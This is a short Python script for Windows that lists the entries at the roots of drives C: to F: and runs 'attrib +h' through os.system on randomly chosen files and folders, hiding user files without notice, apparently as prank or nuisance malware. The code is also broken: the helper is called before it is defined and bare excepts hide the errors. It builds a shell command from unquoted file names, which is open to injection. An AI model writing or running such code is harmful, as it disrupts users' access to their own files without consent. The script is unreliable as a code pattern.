#Windows version
import os
import random
drive = ['C:\\','D:\\','E:\\','F:\\']
filelist = []
dirlist = []
for i in drive :
    os.chdir(i)
    FDlist = os.listdir(i)
        
        #FDlist = os.listdir(i)
    for i in FDlist :
        if (os.path.isdir(i)):
            dirlist.append(i)
        else:
            filelist.append(i)
    try:
        hidefile(filelist)
        continue
    except:
        continue
#    print(filelist)
#    print('\n')
#    print(dirlist)
#    print('\n')
    for i in dirlist :
        try:
            FDlist = os.listdir(i)
            hidefile(FDlist)
            continue
        except:
            continue
def hidefile(FD):
    path = random.choice(FD)
    os.system("attrib +h "+path)



